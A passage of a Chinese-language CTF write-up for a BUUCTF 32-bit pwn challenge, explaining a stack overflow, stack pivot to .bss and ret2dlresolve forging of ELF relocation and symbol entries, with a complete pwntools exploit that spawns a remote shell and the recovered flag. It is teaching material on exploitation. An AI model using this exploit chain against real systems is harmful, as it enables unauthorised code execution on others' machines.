+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    Elf32_Addr  r_offset;
+</span></span><span style="display:flex;"><span>    Elf32_Word  r_info;
+</span></span><span style="display:flex;"><span>} Elf32_Rel;
+</span></span></code></pre></div><p>构造：</p>
+<ul>
+<li><code>r_offset</code>：写解析结果的位置</li>
+<li><code>r_info</code>：指向伪造的符号表项，并指定类型</li>
+</ul>
+<p>这里一般把 <code>r_offset</code> 设为某个 GOT 表项，比如 <code>write@got</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fake_rel <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    p32(write_got),
+</span></span><span style="display:flex;"><span>    p32(r_info)
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div>
+<h3 id="2-伪造符号表项-elf32_sym" data-numberify>2. 伪造符号表项 Elf32_Sym<a class="anchor ms-1" href="#2-伪造符号表项-elf32_sym"></a></h3>
+<p><code>Elf32_Sym</code> 大小 16 字节：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>    Elf32_Word    st_name;
+</span></span><span style="display:flex;"><span>    Elf32_Addr    st_value;
+</span></span><span style="display:flex;"><span>    Elf32_Word    st_size;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_info;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> st_other;
+</span></span><span style="display:flex;"><span>    Elf32_Half    st_shndx;
+</span></span><span style="display:flex;"><span>} Elf32_Sym;
+</span></span></code></pre></div><p>重点只需要 <code>st_name</code> 有效，指向字符串 <code>&quot;system&quot;</code> 在 <code>.dynstr</code> 中的偏移。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fake_sym <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    p32(fake_str_addr <span style="color:#f92672">-</span> strtab),
+</span></span><span style="display:flex;"><span>    p32(<span style="color:#ae81ff">0</span>),
+</span></span><span style="display:flex;"><span>    p32(<span style="color:#ae81ff">0</span>),
+</span></span><span style="display:flex;"><span>    p32(<span style="color:#ae81ff">0x12</span>)
+</span></span><span style="display:flex;"><span>)
+</span></span></code></pre></div>
+<h3 id="3-伪造字符串-systemx00" data-numberify>3. 伪造字符串 "system\x00"<a class="anchor ms-1" href="#3-伪造字符串-systemx00"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;system</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span></code></pre></div><hr>
+
+<h2 id="十对齐问题" data-numberify>十、对齐问题<a class="anchor ms-1" href="#十对齐问题"></a></h2>
+<p>这是 <code>ret2dlresolve</code> 里最容易出错的点。</p>
+<p><code>Elf32_Sym</code> 要求按 16 字节对齐，所以通常需要计算一个 <code>align</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>align <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> ((base_stage <span style="color:#f92672">+</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">-</span> dynsym) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span>
+</span></span><span style="display:flex;"><span>fake_sym_addr <span style="color:#f92672">=</span> base_stage <span style="color:#f92672">+</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">+</span> align
+</span></span></code></pre></div><p>如果不对齐，动态链接器解析时很容易崩溃。</p>
+<hr>
+
+<h2 id="十一第二阶段-payload-构造" data-numberify>十一、第二阶段 payload 构造<a class="anchor ms-1" href="#十一第二阶段-payload-构造"></a></h2>
+<p>关键代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>fake_rel_addr <span style="color:#f92672">=</span> base_stage <span style="color:#f92672">+</span> <span style="color:#ae81ff">28</span>
+</span></span><span style="display:flex;"><span>align <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> ((base_stage <span style="color:#f92672">+</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">-</span> DYNSYM) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF</span>
+</span></span><span style="display:flex;"><span>fake_sym_addr <span style="color:#f92672">=</span> base_stage <span style="color:#f92672">+</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">+</span> align
+</span></span><span style="display:flex;"><span>fake_str_addr <span style="color:#f92672">=</span> fake_sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r_info <span style="color:#f92672">=</span> (((fake_sym_addr <span style="color:#f92672">-</span> DYNSYM) <span style="color:#f92672">//</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x7</span>
+</span></span><span style="display:flex;"><span>fake_rel <span style="color:#f92672">=</span> flat(p32(WRITE_GOT), p32(r_info))
+</span></span><span style="display:flex;"><span>fake_sym <span style="color:#f92672">=</span> flat(p32(fake_str_addr <span style="color:#f92672">-</span> STRTAB), p32(<span style="color:#ae81ff">0</span>), p32(<span style="color:#ae81ff">0</span>), p32(<span style="color:#ae81ff">0x12</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>,
+</span></span><span style="display:flex;"><span>    p32(PLT0),
+</span></span><span style="display:flex;"><span>    p32(fake_rel_addr <span style="color:#f92672">-</span> REL_PLT),
+</span></span><span style="display:flex;"><span>    p32(POP3_RET),
+</span></span><span style="display:flex;"><span>    p32(base_stage <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span>),
+</span></span><span style="display:flex;"><span>    p32(base_stage <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span>),
+</span></span><span style="display:flex;"><span>    p32(len(cmd)),
+</span></span><span style="display:flex;"><span>    fake_rel,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> align,
+</span></span><span style="display:flex;"><span>    fake_sym,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;system</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> payload2<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">80</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>) <span style="color:#f92672">+</span> cmd
+</span></span><span style="display:flex;"><span>payload2 <span style="color:#f92672">=</span> payload2<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span></code></pre></div><hr>
+
+<h2 id="十二为什么这样布置栈" data-numberify>十二、为什么这样布置栈<a class="anchor ms-1" href="#十二为什么这样布置栈"></a></h2>
+<p>第二阶段迁移到 <code>.bss</code> 后，栈布局大概如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>base_stage:
+</span></span><span style="display:flex;"><span>    &#34;AAAA&#34;                 -&gt; 被 leave/pop ebp 吃掉
+</span></span><span style="display:flex;"><span>    PLT0                   -&gt; ret 到这里，进入动态解析
+</span></span><span style="display:flex;"><span>    reloc_arg              -&gt; 告诉解析器去处理哪个重定位项
+</span></span><span style="display:flex;"><span>    POP3_RET               -&gt; system 返回后的地址
+</span></span><span style="display:flex;"><span>    arg1 = base_stage+80   -&gt; system(&#34;/bin/sh&#34;) 的参数
+</span></span><span style="display:flex;"><span>    arg2 = base_stage+80   -&gt; 给 POP3_RET 凑栈
+</span></span><span style="display:flex;"><span>    arg3 = len(cmd)        -&gt; 给 POP3_RET 凑栈
+</span></span><span style="display:flex;"><span>    fake_rel
+</span></span><span style="display:flex;"><span>    padding
+</span></span><span style="display:flex;"><span>    fake_sym
+</span></span><span style="display:flex;"><span>    &#34;system\x00&#34;
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>    &#34;/bin/sh\x00&#34;
+</span></span></code></pre></div><p>注意这里：</p>
+
+<h3 id="1-plt0" data-numberify>1. PLT0<a class="anchor ms-1" href="#1-plt0"></a></h3>
+<p>调用方式本质上类似：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">dl_runtime_resolve</span>(reloc_index)
+</span></span></code></pre></div>
+<h3 id="2-reloc_arg" data-numberify>2. reloc_arg<a class="anchor ms-1" href="#2-reloc_arg"></a></h3>
+<p>传的是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fake_rel_addr <span style="color:#f92672">-</span> rel_plt
+</span></span></code></pre></div><p>因为动态解析器是通过 <code>.rel.plt</code> 基址加偏移去找条目的。</p>
+
+<h3 id="3-system-参数" data-numberify>3. system 参数<a class="anchor ms-1" href="#3-system-参数"></a></h3>
+<p>当解析结束后，控制流会跳到解析得到的 <code>system</code>，其栈上参数就是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p32(base_stage <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span>)
+</span></span></code></pre></div><p>即指向 <code>/bin/sh\x00</code></p>
+<hr>
+
+<h2 id="十三完整-exp" data-numberify>十三、完整 exp<a class="anchor ms-1" href="#十三完整-exp"></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;i386&#34;</span>, os<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;linux&#34;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;info&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;node5.buuoj.cn&#34;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">28980</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./level4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OFFSET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x88</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span>READ_PLT <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#34;read&#34;</span>]
+</span></span><span style="display:flex;"><span>WRITE_GOT <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;write&#34;</span>]
+</span></span><span style="display:flex;"><span>PLT0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048300</span>
+</span></span><span style="display:flex;"><span>POP3_RET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048509</span>
+</span></span><span style="display:flex;"><span>POP_EBP_RET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804850B</span>
+</span></span><span style="display:flex;"><span>LEAVE_RET <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080483B8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BSS <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#34;.bss&#34;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
+</span></span><span style="display:flex;"><span>REL_PLT <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#34;.rel.plt&#34;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
+</span></span><span style="display:flex;"><span>DYNSYM <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#34;.dynsym&#34;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
+</span></span><span style="display:flex;"><span>STRTAB <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#34;.dynstr&#34;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>STACK_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x800</span>
+</span></span><span style="display:flex;"><span>BASE_STAGE <span style="color:#f92672">=</span> BSS <span style="color:#f92672">+</span> STACK_SIZE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build_stage1</span>():
+</span></span><span style="display:flex;"><span>    chain <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> OFFSET,
+</span></span><span style="display:flex;"><span>        p32(READ_PLT),
+</span></span><span style="display:flex;"><span>        p32(POP3_RET),
+</span></span><span style="display:flex;"><span>        p32(<span style="color:#ae81ff">0</span>),
+</span></span><span style="display:flex;"><span>        p32(BASE_STAGE),
+</span></span><span style="display:flex;"><span>        p32(<span style="color:#ae81ff">100</span>),
+</span></span><span style="display:flex;"><span>        p32(POP_EBP_RET),
+</span></span><span style="display:flex;"><span>        p32(BASE_STAGE),
+</span></span><span style="display:flex;"><span>        p32(LEAVE_RET),
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> chain<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build_stage2</span>():
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    fake_rel_addr <span style="color:#f92672">=</span> BASE_STAGE <span style="color:#f92672">+</span> <span style="color:#ae81ff">28</span>
+</span></span><span style="display:flex;"><span>    align <span style="color:#f92672">=</span> (<span style="color:#ae81ff">0x10</span> <span style="color:#f92672">-</span> ((BASE_STAGE <span style="color:#f92672">+</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">-</span> DYNSYM) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF</span>
+</span></span><span style="display:flex;"><span>    fake_sym_addr <span style="color:#f92672">=</span> BASE_STAGE <span style="color:#f92672">+</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">+</span> align
+</span></span><span style="display:flex;"><span>    fake_str_addr <span style="color:#f92672">=</span> fake_sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r_info <span style="color:#f92672">=</span> (((fake_sym_addr <span style="color:#f92672">-</span> DYNSYM) <span style="color:#f92672">//</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x7</span>
+</span></span><span style="display:flex;"><span>    fake_rel <span style="color:#f92672">=</span> flat(p32(WRITE_GOT), p32(r_info))
+</span></span><span style="display:flex;"><span>    fake_sym <span style="color:#f92672">=</span> flat(p32(fake_str_addr <span style="color:#f92672">-</span> STRTAB), p32(<span style="color:#ae81ff">0</span>), p32(<span style="color:#ae81ff">0</span>), p32(<span style="color:#ae81ff">0x12</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAA&#34;</span>,
+</span></span><span style="display:flex;"><span>        p32(PLT0),
+</span></span><span style="display:flex;"><span>        p32(fake_rel_addr <span style="color:#f92672">-</span> REL_PLT),
+</span></span><span style="display:flex;"><span>        p32(POP3_RET),
+</span></span><span style="display:flex;"><span>        p32(BASE_STAGE <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span>),
+</span></span><span style="display:flex;"><span>        p32(BASE_STAGE <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span>),
+</span></span><span style="display:flex;"><span>        p32(len(cmd)),
+</span></span><span style="display:flex;"><span>        fake_rel,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> align,
+</span></span><span style="display:flex;"><span>        fake_sym,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;system</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">80</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>) <span style="color:#f92672">+</span> cmd
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(build_stage1())
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(build_stage2())
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>如果想直接读 flag，也可以这样：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(HOST, PORT)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(build_stage1())
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(build_stage2())
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cat flag&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+
+<h2 id="十四利用过程总结" data-numberify>十四、利用过程总结<a class="anchor ms-1" href="#十四利用过程总结"></a></h2>
+<p>整个攻击链可以概括为：</p>
+<ol>
+<li><code>read(0, buf, 0x100)</code> 触发栈溢出</li>
+<li>覆盖返回地址，执行第一阶段 ROP</li>
+<li>第一阶段调用 <code>read(0, .bss, 100)</code>，把第二阶段数据写到 <code>.bss</code></li>
+<li>通过 <code>pop ebp; ret</code> 和 <code>leave; ret</code> 完成栈迁移</li>
+<li>第二阶段在 <code>.bss</code> 中伪造：
+<ul>
+<li><code>Elf32_Rel</code></li>
+<li><code>Elf32_Sym</code></li>
+<li><code>&quot;system\x00&quot;</code></li>
+</ul>
+</li>
+<li>调用 <code>plt[0]</code>，让动态链接器解析 <code>system</code></li>
+<li>解析完成后执行 <code>system(&quot;/bin/sh&quot;)</code></li>
+<li>拿到 shell，读取 <code>flag</code></li>
+</ol>
+<hr>
+
+<h2 id="十五这题的考点" data-numberify>十五、这题的考点<a class="anchor ms-1" href="#十五这题的考点"></a></h2>
+<p>这题的核心考点有几个：</p>
+
+<h3 id="1-栈溢出基础" data-numberify>1. 栈溢出基础<a class="anchor ms-1" href="#1-栈溢出基础"></a></h3>
+<p>看到：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x100</span>)
+</span></span></code></pre></div><p>且 <code>buf</code> 明显小于 <code>0x100</code>，就要第一时间想到返回地址可控。</p>
+
+<h3 id="2-nx-开启后的利用方式" data-numberify>2. NX 开启后的利用方式<a class="anchor ms-1" href="#2-nx-开启后的利用方式"></a></h3>
+<p>不能打 shellcode，就要转向 ROP。</p>
+
+<h3 id="3-栈迁移" data-numberify>3. 栈迁移<a class="anchor ms-1" href="#3-栈迁移"></a></h3>
+<p>第一阶段空间不够时，常见手法就是：</p>
+<ul>
+<li>迁移到 <code>.bss</code></li>
+<li>迁移到堆</li>
+<li>迁移到可控大缓冲区</li>
+</ul>
+
+<h3 id="4-ret2dlresolve" data-numberify>4. ret2dlresolve<a class="anchor ms-1" href="#4-ret2dlresolve"></a></h3>
+<p>当程序里没有 <code>system</code>，也不想依赖远程 libc 泄漏时，<code>ret2dlresolve</code> 是非常强的方案。</p>
+<hr>
+
+<h2 id="十六易错点" data-numberify>十六、易错点<a class="anchor ms-1" href="#十六易错点"></a></h2>
+<p>这题有几个很容易出错的地方：</p>
+
+<h3 id="1-第一阶段长度" data-numberify>1. 第一阶段长度<a class="anchor ms-1" href="#1-第一阶段长度"></a></h3>
+<p>程序第一次 <code>read</code> 读的是 <code>0x100</code> 字节，所以第一阶段最好补到正好 <code>0x100</code>，避免输入残留影响第二次 <code>read</code>。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">return</span> chain<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span></code></pre></div>
+<h3 id="2-第二阶段长度" data-numberify>2. 第二阶段长度<a class="anchor ms-1" href="#2-第二阶段长度"></a></h3>
+<p>第一阶段 ROP 中第二次 <code>read</code> 读的是 <code>100</code> 字节，所以第二阶段也要控制成正好 <code>100</code> 字节：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">return</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span>)
+</span></span></code></pre></div>
+<h3 id="3-elf32_sym-对齐" data-numberify>3. Elf32_Sym 对齐<a class="anchor ms-1" href="#3-elf32_sym-对齐"></a></h3>
+<p>必须按 16 字节对齐，不然大概率崩。</p>
+
+<h3 id="4-r_info-计算" data-numberify>4. r_info 计算<a class="anchor ms-1" href="#4-r_info-计算"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>r_info <span style="color:#f92672">=</span> (((fake_sym_addr <span style="color:#f92672">-</span> DYNSYM) <span style="color:#f92672">//</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x7</span>
+</span></span></code></pre></div><p>这里的符号索引和重定位类型都不能写错。</p>
+
+<h3 id="5-reloc_arg" data-numberify>5. reloc_arg<a class="anchor ms-1" href="#5-reloc_arg"></a></h3>
+<p>传给 <code>plt[0]</code> 的不是绝对地址，而是相对于 <code>.rel.plt</code> 的偏移：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fake_rel_addr <span style="color:#f92672">-</span> REL_PLT
+</span></span></code></pre></div><hr>
+
+<h2 id="十七最终结果" data-numberify>十七、最终结果<a class="anchor ms-1" href="#十七最终结果"></a></h2>
+<p>成功拿到 shell 并读出 flag：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>flag{7615020a-7615-462f-8ed9-00f7f5f2f16f}
+</span></span></code></pre></div><hr>
+
+<h2 id="十八附一句话总结" data-numberify>十八、附：一句话总结<a class="anchor ms-1" href="#十八附一句话总结"></a></h2>
+<p>这题本质上是一个：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>32位无 canary 栈溢出 + 栈迁移 + ret2dlresolve
+</span></span></code></pre></div><p>利用链简洁直接，重点在于：</p>
+<ul>
+<li>找准偏移</li>
+<li>做好 <code>.bss</code> 栈迁移</li>
+<li>正确伪造 <code>Elf32_Rel</code> 和 <code>Elf32_Sym</code></li>
+<li>注意对齐和长度控制</li>
+</ul>
+</div>
+</div>
+</div><div class="card-footer">
+  <div class="post-navs d-flex justify-content-evenly"><div class="post-nav post-prev">
+      <i class="fas fa-fw fa-chevron-down post-prev-icon me-1" data-fa-transform="rotate-90"></i>
+      <a href="/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-3/2-3-2/exp1/">exp1</a>
+    </div><div class="post-nav post-next">
+      <a href="/buu/%E7%AC%AC%E4%BA%8C%E9%A1%B5/2-3/2-3-2/2-3-2/">2-3-2</a>
+      <i class="fas fa-fw fa-chevron-down post-next-icon ms-1" data-fa-transform="rotate-270"></i>
+    </div></div>
+</div></article><div class="post-copyright mb-3 row card component" id="post-copyright">
+    <div class="card-header">
+        <h2 class="card-title fs-4 my-2 text-surface">版权</h2>
+    </div>
+    <div class="card-body">
+
+    </div>
+</div><div class="card component row post-comments" id="post-comments">
